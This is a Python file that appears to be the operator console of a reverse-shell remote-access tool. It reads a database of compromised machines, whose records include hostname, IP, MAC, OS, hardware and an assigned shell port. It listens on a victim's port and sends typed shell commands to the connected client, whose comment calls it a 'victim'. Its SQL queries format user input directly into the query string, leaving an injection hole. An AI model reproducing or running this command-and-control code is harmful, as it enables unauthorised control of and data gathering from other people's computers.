import socket
import reverse_sh
import sqlite3
import sys
import socket

hostname = socket.gethostname()

ip_addr = socket.gethostbyname(hostname)


def socket_accept(port):
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn, port)
    conn.close()


# Send commands to client/victim or a friend
def send_commands(conn, port):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def create_socket(port):
    try:
        global host
        global s
        host = ""
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket(port):
    try:
        global host

        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket(port)


def main(port):
    create_socket(port)
    bind_socket(port)
    socket_accept(port)


def reversh(cmd):
    uuid = cmd.split(" ")[1]

    con = sqlite3.connect('../../users')
    cur = con.cursor()
    print("[INFO] Database succesfully loaded")
    cur = cur.execute("SELECT ATTRIBUTED_PORT FROM users WHERE ID = '{}';".format(uuid))
    port = cur.fetchone()[0]
    int_port = int(port)
    main(int_port)
def info(cmd):
    uuid = cmd.split(" ")[1]
    con = sqlite3.connect("../../users")
    cur = con.cursor()
    cur = cur.execute("SELECT * FROM users WHERE ID='{}';".format(uuid))
    info = cur.fetchone()
    print("Machine Name : {}".format(info[1]))
    print("IP : {}".format(info[2]))
    print("MAC adress : {}".format(info[3]))
    print("Platform : {}".format(info[4]))
    print("OS type : {}".format(info[5]))
    print("Bits : {}".format(info[7]))
    print("Number of CPU core: {}".format(info[8]))
    print("Maximum frequency of CPU : {} Hz".format(info[9]))
    print("RAM : {} go".format(info[11]))
    print("Broadcast IP : {}".format(info[12]))
    print("Attributed Port for reverse Shell : {}".format(info[15]))


while True:
    cmd = input("/>")
    if cmd == "exit":
        break
    elif "reversh" in cmd:
        reversh(cmd)
    elif "info" in cmd:
        info(cmd)